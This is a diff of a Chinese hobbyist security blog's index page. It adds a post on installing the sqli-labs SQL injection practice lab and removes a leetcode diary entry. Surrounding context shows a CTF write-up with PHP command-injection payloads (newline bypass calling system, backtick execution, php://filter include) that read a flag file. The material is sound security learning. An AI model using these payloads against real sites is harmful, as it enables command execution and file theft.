@@ -169,6 +169,75 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-php靶场" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/01/15/php%E9%9D%B6%E5%9C%BA/" class="article-date">
+  	<time datetime="2021-01-15T12:33:57.000Z" itemprop="datePublished">2021-01-15</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/01/15/php%E9%9D%B6%E5%9C%BA/">
+        sqlilabs靶场的搭建
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>下载PHPstudy（具体步骤见本霸霸上一篇博客）之后，配置如下环境<br><img src="/2021/01/15/php%E9%9D%B6%E5%9C%BA/sql0.png"><br><br>然后访问网址：（<a target="_blank" rel="noopener" href="https://github.com/Audi-1/sqli-labs%EF%BC%89">https://github.com/Audi-1/sqli-labs）</a> 如下图<br><br><img src="/2021/01/15/php%E9%9D%B6%E5%9C%BA/sql3.png"><br><br>下载zip文件<br><br><img src="/2021/01/15/php%E9%9D%B6%E5%9C%BA/sql4.png"><br><br>下载过后将文件复制到如下路径中，并将文件名修改为sql<br><br><img src="/2021/01/15/php%E9%9D%B6%E5%9C%BA/sql5.png"><br><br>然后再浏览器上访问：（<a target="_blank" rel="noopener" href="https://localhost/sql/%EF%BC%89">https://localhost/sql/）</a> 会出现以下界面<br><br><img src="/2021/01/15/php%E9%9D%B6%E5%9C%BA/sql1.png"><br><br>点击第一个出现以下界面<br><br><img src="/2021/01/15/php%E9%9D%B6%E5%9C%BA/sql2.png"><br><br>则sqlilabs靶场搭建成功<br></p>
+<h3>注：</h3>
+<p>sqli-labs靶场需要php环境。而且对php7不兼容，当初写这个靶场印度程序员使用的版本不是php7，当时的一些函数在php7中被删除了。所以，使用此靶场请下载5.5或之前的版本，如下图</p>
+<img src="/2021/01/15/php%E9%9D%B6%E5%9C%BA/sql7.png">
+<br>如果未成功显示successfully页面。可能存在两种原因:<br>
+
+<ul>
+<li>1.访问路径不正确。
+</li><li>2.php版本不兼容
+</li></ul>
+<b>解决方法：</b>
+<ul>
+<li>1 http://localhost/sql/ 这个sql文件夹是自己创建的，如果没有创建该文件夹，而是在解压sql-labs压缩包时直接将其解压到WWW目录下，则直接访问http://localhost/。
+</li><li>2 将php版本换到5.5及以下。
+</li></ul>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-php" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -752,61 +821,6 @@ $$ 导致的变量覆盖问题在CTF代码审计题目中经常在foreach中出�
         <p>  今天，写了web小分队里发的一道web基础题，它是关于php简单绕过的。<br>  具体wp如下<br>  首先打开网址，会看到以下内容<br>  <img src="/2020/11/23/basic-rce1/web1.png"><br>  根据内容，可以看出是一道php换行符绕过题（%0a），我们输入以下payload<br>  【GET】 /?a=system(%27%0acat%20f*%20|%20base64%27)；<br>  <img src="/2020/11/23/basic-rce1/web2.png"><br>  成功绕过！<br>  根据内容可以看出时base64编码，在百度上搜索base64在线解码器，进行在线解码<br>  <img src="/2020/11/23/basic-rce1/web3.png"><br>  dingdong!成功得到flag~<br>  注：<br>  exp1：php执行运算符<br>  GET /?a=echo <code>base64 flag.php</code></p>
 <p>  exp2：换行符绕过（%0a）<br>  GET /?a=system(%27%0acat%20f*%20|%20base64%27);</p>
 <p>  exp3：利用include函数加php伪协议<br>  GET /a=include%20%27php://filter/convert.base64-encode/resource=./flag.php%27;<br>  （baba童鞋还是可以正经滴）</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-leetcode" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2020/11/19/leetcode/" class="article-date">
-  	<time datetime="2020-11-19T08:25:00.000Z" itemprop="datePublished">2020-11-19</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/11/19/leetcode/">
-        准霸霸的leetcode第一次提交
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>  今天，我在leetcode平台上提交的第一个签到题，我向成为霸霸的目标又迈进一步。<br>  开始时，我遇到些问题，自己还没有学过c++，直接在百度上搜索的代码，然后我就提交了这样的代码<br>  <img src="/2020/11/19/leetcode/c++.png" class title="This is an c++"><br>  但它不可以，虽然测试结果ok，但提交时执行错误<br>  <img src="/2020/11/19/leetcode/bibi.png"><br>  哎，宝宝心很累，尝试很多次，还是不行，∴决定从头再来。嘿嘿<br>  <img src="/2020/11/19/leetcode/haha.png"><br>  果然不出所料，本baobao提交成功了，撒花!giao~<br>  <img src="/2020/11/19/leetcode/enen.png"><br>  本baba觉得很开心，觉得离转成正式霸霸又近了一步，hiahia~<br>  朝成为霸霸的梦想ccc！giao~</p>
 
       
     </div>
